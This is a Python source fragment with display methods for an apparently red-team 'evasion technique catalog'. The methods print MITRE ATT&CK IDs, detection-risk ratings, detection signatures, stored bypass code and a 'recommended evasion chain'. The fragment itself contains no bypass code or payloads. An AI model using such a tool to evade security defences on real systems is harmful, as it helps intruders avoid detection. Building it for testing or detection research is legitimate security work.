    # ─── Formatting ──────────────────────────────────────────────

    def format_catalog(self) -> str:
        """Format full catalog as text."""
        lines = ["EVASION TECHNIQUE CATALOG", "=" * 60]
        s = self.stats()
        lines.append(f"  {s['total_techniques']} techniques, {s['mitre_ids']} MITRE ATT&CK IDs")
        lines.append(f"  {s['with_detection']} with detection signatures")
        lines.append(f"  {s['with_bypass_code']} with bypass code")
        lines.append("")

        for cat, count in sorted(self.list_categories().items()):
            lines.append(f"  [{cat.upper()}] ({count} techniques)")
            for t in self.by_category(cat):
                risk_bar = '*' * t.detection_risk + '.' * (5 - t.detection_risk)
                lines.append(f"    {t.id:8s} {t.name[:35]:<35s} "
                             f"risk=[{risk_bar}] diff={t.difficulty} "
                             f"{'MITRE:' + t.mitre_id if t.mitre_id else ''}")
            lines.append("")

        return '\n'.join(lines)

    def format_technique(self, id: str) -> str:
        """Format single technique detail."""
        t = self.catalog.get(id)
        if not t:
            return f"Unknown technique: {id}"

        lines = [
            f"TECHNIQUE: {t.id} — {t.name}",
            f"  Category:    {t.category}/{t.subcategory}",
            f"  Platform:    {t.platform}",
            f"  MITRE:       {t.mitre_id or 'N/A'}",
            f"  Difficulty:  {t.difficulty}/5",
            f"  Detection:   {t.detection_risk}/5",
            f"",
            f"  {t.description}",
        ]

        if t.detection_methods:
            lines.append(f"")
            lines.append(f"  DETECTION SIGNATURES:")
            for dm in t.detection_methods:
                lines.append(f"    [{dm['type']:10s}] {dm['signature']}")
                lines.append(f"               Tool: {dm.get('tool', '?')}")

        if t.bypass_code:
            lines.append(f"")
            lines.append(f"  BYPASS CODE ({t.bypass_code.count(chr(10))+1} lines):")
            for line in t.bypass_code.split('\n')[:10]:
                lines.append(f"    {line}")
            if t.bypass_code.count('\n') > 9:
                lines.append(f"    ... ({t.bypass_code.count(chr(10))-9} more lines)")

        if t.related:
            lines.append(f"")
            lines.append(f"  RELATED: {', '.join(t.related)}")

        return '\n'.join(lines)

    def format_chain(self, chain: List[EvasionTechnique]) -> str:
        """Format recommended evasion chain."""
        lines = ["RECOMMENDED EVASION CHAIN", "=" * 60]
        for i, t in enumerate(chain, 1):
            lines.append(f"  Step {i}: [{t.category}] {t.name}")
            lines.append(f"          {t.id} — risk={t.detection_risk}/5, "
                         f"MITRE:{t.mitre_id or 'N/A'}")
        return '\n'.join(lines)
